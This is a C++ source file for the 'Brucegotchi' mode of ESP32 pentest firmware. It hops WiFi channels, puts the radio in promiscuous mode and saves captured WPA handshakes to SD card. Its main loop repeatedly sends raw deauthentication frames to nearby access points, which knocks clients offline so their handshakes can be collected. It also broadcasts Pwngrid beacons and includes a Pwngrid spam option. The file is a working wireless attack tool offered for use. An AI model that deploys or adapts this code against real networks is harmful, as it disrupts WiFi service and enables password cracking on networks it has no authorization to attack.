/*
Thanks to thoses developers for their projects:
* @7h30th3r0n3 : https://github.com/7h30th3r0n3/Evil-M5Core2 and https://github.com/7h30th3r0n3/PwnGridSpam
* @viniciusbo : https://github.com/viniciusbo/m5-palnagotchi
* @sduenasg : https://github.com/sduenasg/pio_palnagotchi

Thanks to @bmorcelli for his help doing a better code.
*/

#include "../wifi/sniffer.h"
#include "../wifi/wifi_atks.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "esp_err.h"
#include "spam.h"
#include "ui.h"
#include <Arduino.h>

#define STATE_INIT 0
#define STATE_WAKE 1
#define STATE_HALT 255

// Cap the number of deauth operations per main-cycle to avoid long blocking loops
#ifndef MAX_DEAUTH_PER_CYCLE
#define MAX_DEAUTH_PER_CYCLE 50
#endif

void advertise(uint8_t channel);
void wakeUp();

uint8_t state;
uint8_t current_channel = 0; // index into channels_map (0..2)
uint32_t last_mood_switch = 10001;
bool pwnagotchi_exit = false;

// small local constant channel list (we hop through 1, 6, 11 to catch most APs)
static const uint8_t channels_map[3] = {1, 6, 11};
static constexpr size_t channels_map_count = 3;

// ---------- Performance helpers ----------
static uint32_t last_ui_update_ms = 0;
// throttle redraws
static const uint32_t UI_UPDATE_INTERVAL_MS = 750;

inline void maybeUpdateUi(bool force) {
    uint32_t now = millis();
    if (force || (now - last_ui_update_ms) >= UI_UPDATE_INTERVAL_MS) {
        last_ui_update_ms = now;
        updateUi(true);
    }
}

// Helper: return true if we should switch mood (non-blocking)
static inline bool shouldSwitchMood(uint32_t now_ms, uint32_t last_switch_ms, uint32_t threshold = 2500U) {
    return ((now_ms - last_switch_ms) > threshold);
}
// ---------- End helpers ----------

void brucegotchi_setup() {
    initPwngrid();
    initUi();
    // ensure UI draws at least once at startup
    maybeUpdateUi(true);
    state = STATE_INIT;
    Serial.println("Brucegotchi Initialized");
}

void brucegotchi_update() {
    if (state == STATE_HALT) { return; }

    if (state == STATE_INIT) {
        state = STATE_WAKE;
        wakeUp();
        // force immediate UI update so wake animation shows
        maybeUpdateUi(true);
    }

    if (state == STATE_WAKE) {
        checkPwngridGoneFriends();

        // hop channel index (0,1,2,0,1,2,...)
        current_channel = (current_channel + 1) % channels_map_count;
        uint8_t chan = channels_map[current_channel];

        // set global ch
        ch = chan;

        // advertise once per update
        advertise(chan);
    }

    // throttled UI update (keeps life ui alive while reducing redraws)
    maybeUpdateUi(false);
}

void wakeUp() {
    for (uint8_t i = 0; i < 3; i++) {
        setMood(i);
        updateUi(false);
        vTaskDelay(1250 / portTICK_RATE_MS);
    }
}

void advertise(uint8_t channel) {
    uint32_t elapsed = millis() - last_mood_switch;
    if (elapsed > 2500) {
        setMood(random(2, getNumberOfMoods() - 1)); // random mood (same as original)
        last_mood_switch = millis();
    }

    esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());

    if (result == ESP_ERR_WIFI_IF) {
        setMood(MOOD_BROKEN, "", "Error: invalid interface", true);
        state = STATE_HALT;
    } else if (result == ESP_ERR_INVALID_ARG) {
        setMood(MOOD_BROKEN, "", "Error: invalid argument", true);
        state = STATE_HALT;
    } else if (result == ESP_ERR_NO_MEM) {
        setMood(MOOD_BROKEN, "", "Error: not enaugh memory", true);
        state = STATE_HALT;
    } else if (result != ESP_OK) {
        setMood(MOOD_BROKEN, "", "Error: unknown", true);
        state = STATE_HALT;
    }
}

void set_pwnagotchi_exit(bool new_value) { pwnagotchi_exit = new_value; }

void brucegotchi_start() {
    uint32_t tmp = 0;         // Control workflow (millis-based)
    bool shot = false;        // Control deauth faces
    bool pwgrid_done = false; // Control to start advertising
    bool Deauth_done = false; // Control to start deauth
    uint8_t _times = 0;       // control delays without impacting control btns
    set_pwnagotchi_exit(false);

    tft.fillScreen(bruceConfig.bgColor);
    num_HS = 0; // restart pwnagotchi counting

    // Prepare storage before enabling promiscuous mode
    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP")) SD.mkdir("/BrucePCAP");
        if (!SD.exists("/BrucePCAP/handshakes")) SD.mkdir("/BrucePCAP/handshakes");
        handshakeFs = &SD;
    } else {
        if (!LittleFS.exists("/BrucePCAP")) LittleFS.mkdir("/BrucePCAP");
        if (!LittleFS.exists("/BrucePCAP/handshakes")) LittleFS.mkdir("/BrucePCAP/handshakes");
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }

    if (handshakeFs) {
        sniffer_prepare_storage(handshakeFs, !isLittleFS);
        // reset cache once here
        sniffer_reset_handshake_cache();
    }

    brucegotchi_setup(); // start the thing

    // Draw footer & header
    drawTopCanvas();
    drawBottomCanvas();

    // Clear registeredBeacon set
    registeredBeacons.clear();

    // prepares the Deauth frame
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    // Pwnagotchi only looks for handshakes
    sniffer_set_mode(SnifferMode::HandshakesOnly);

#if defined(HAS_TOUCH)
    TouchFooter();
#endif

    // initial update
    brucegotchi_update();

    tmp = millis();
    // main loop
    while (true) {
        uint32_t now = millis();
        uint32_t delta = now - tmp;

        if (delta < 2000 && !Deauth_done) {
            Deauth_done = true;
            drawMood("(-@_@)", "Preparing Deauth Sniper");
        }

        if (delta > (2000 + 1000 * _times) && Deauth_done && !pwgrid_done) {
            // if many beacons, clear to avoid long cycles
            size_t regSize = registeredBeacons.size();
            if (regSize > 30) { registeredBeacons.clear(); }

            // iterate and send deauth frames, cap per cycle to avoid blocking
            size_t processed = 0;
            for (const auto &registeredBeacon : registeredBeacons) {
                if (registeredBeacon.channel == ch) {
                    memcpy(&ap_record.bssid, registeredBeacon.MAC, 6);
                    wsl_bypasser_send_raw_frame(&ap_record, registeredBeacon.channel);
                    send_raw_frame(deauth_frame, 26);

                    processed++;
                    if (processed >= MAX_DEAUTH_PER_CYCLE) { break; }
                }
                if (SelPress) break;
            }

            // update life drawing for shooting status
            drawMood(shot ? "(<<_<<)" : "(>>_>>)", shot ? "Lasers Activated! Deauthing" : "pew! pew! pew!");
            _times++;
            shot = !shot;
        }

        if (delta > 12000 && pwgrid_done == false) {
            drawMood("(^__^)", "Lets Make Friends!");
            _times = 0;
            pwgrid_done = true;
        }

        if (pwgrid_done && delta > (12000 + 3000 * _times)) {
            _times++;
            advertise(ch);
            // use throttled UI update
            maybeUpdateUi(false);
        }

        if (delta > 29500) {
            _times = 0;
            tmp = now;
            pwgrid_done = false;
            Deauth_done = false;
            // call the update that also hops channel and updates UI
            brucegotchi_update();
        }

        if (check(SelPress)) {
            options = {
                {"Find friends", yield},
                {"Pwngrid spam", send_pwnagotchi_beacon_main},
                {"Main Menu", lambdaHelper(set_pwnagotchi_exit, true)},
            };
            // Display menu (blocks until selection)
            loopOptions(options);

            // Redraw footer & header
            tft.fillScreen(bruceConfig.bgColor);
            maybeUpdateUi(true);
        }

        if (pwnagotchi_exit) { break; }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Turn off WiFi
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    wifiDisconnect();
}
